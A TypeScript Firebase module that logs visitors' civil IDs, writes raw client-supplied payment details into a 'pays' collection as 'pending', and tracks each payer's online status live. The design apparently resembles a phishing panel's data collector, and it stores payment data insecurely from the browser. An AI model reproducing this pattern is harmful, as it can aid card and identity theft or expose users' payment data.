import {
    collection,
    addDoc,
    serverTimestamp,
    setDoc,
    doc,
    getFirestore,
    updateDoc,
  } from "firebase/firestore";
  import { initializeApp } from "firebase/app";
  import { getDatabase, onDisconnect, onValue, ref, set } from "firebase/database";
  
  const firebaseConfig = {
    apiKey: "AIzaSyDABw1C30Hscha9m--8OgOHgOe35vfgfvE",
  authDomain: "abds-dc4aa.firebaseapp.com",
  projectId: "abds-dc4aa",
  storageBucket: "abds-dc4aa.firebasestorage.app",
  messagingSenderId: "1076311425985",
  appId: "1:1076311425985:web:01836a0f2a968f86c5a540",
  measurementId: "G-LGTNFCBFGJ"
  };
  
  const app = initializeApp(firebaseConfig);
  export const db = getFirestore(app);
  export const datatabas = getDatabase(app);
  
  interface VisitorData {
    civilId: string;
    timestamp: any;
    userAgent: string;
    violations?: any[];
  }
  
  export async function logVisitor(civilId: string): Promise<string> {
    try {
      const visitorRef = await addDoc(collection(db, "visitors"), {
        civilId,
        timestamp: serverTimestamp(),
        userAgent: navigator.userAgent,
      } as VisitorData);
  
      return visitorRef.id;
    } catch (error) {
      console.error("Error logging visitor:", error);
      throw error;
    }
  }
  
  export async function addData(data: any) {
    const country=localStorage.getItem('country')
    localStorage.setItem("visitor", data.id);
    try {
      const docRef = await doc(db, "pays", data.id!);
      await setDoc(
        docRef,
        { ...data, createdDate: new Date().toISOString() },
        { merge: true }
      );
  
      console.log("Document written with ID: ", docRef.id);
      // You might want to show a success message to the user here
    } catch (e) {
      console.error("Error adding document: ", e);
      // You might want to show an error message to the user here
    }
  }
  export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
    try {
      const visitorId = localStorage.getItem("visitor");
      if (visitorId) {
        const docRef = doc(db, "pays", visitorId);
        await setDoc(
          docRef,
          {
            ...paymentInfo,
            status: "pending",
            createdDate: new Date().toISOString(),
          },
          { merge: true }
        );
        setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
      }
    } catch (error) {
      console.error("Error adding document: ", error);
      alert("Error adding payment info to Firestore");
    }
  };
  
export const setupOnlineStatus = (userId: string) => {
    if (!userId) return;
  
    // Create a reference to this user's specific status node in Realtime Database
    const userStatusRef = ref(datatabas, `/status/${userId}`);
  
    // Create a reference to the user's document in Firestore
    const userDocRef = doc(db, "pays", userId);
  
    // Set up the Realtime Database onDisconnect hook
    onDisconnect(userStatusRef)
      .set({
        state: "offline",
        lastChanged: serverTimestamp(),
      })
      .then(() => {
        // Update the Realtime Database when this client connects
        set(userStatusRef, {
          state: "online",
          lastChanged: serverTimestamp(),
        });
  
        // Update the Firestore document
        updateDoc(userDocRef, {
          online: true,
          lastSeen: serverTimestamp(),
        }).catch((error) =>
          console.error("Error updating Firestore document:", error)
        );
      })
      .catch((error) => console.error("Error setting onDisconnect:", error));
  
    // Listen for changes to the user's online status
    onValue(userStatusRef, (snapshot) => {
      const status = snapshot.val();
      if (status?.state === "offline") {
        // Update the Firestore document when user goes offline
        updateDoc(userDocRef, {
          online: false,
          lastSeen: serverTimestamp(),
        }).catch((error) =>
          console.error("Error updating Firestore document:", error)
        );
      }
    });
  };
  
  export const setUserOffline = async (userId: string) => {
    if (!userId) return;
  
    try {
      // Update the Firestore document
      await updateDoc(doc(db, "pays", userId), {
        online: false,
        lastSeen: serverTimestamp(),
      });
  
      // Update the Realtime Database
      await set(ref(datatabas, `/status/${userId}`), {
        state: "offline",
        lastChanged: serverTimestamp(),
      });
    } catch (error) {
      console.error("Error setting user offline:", error);
    }
}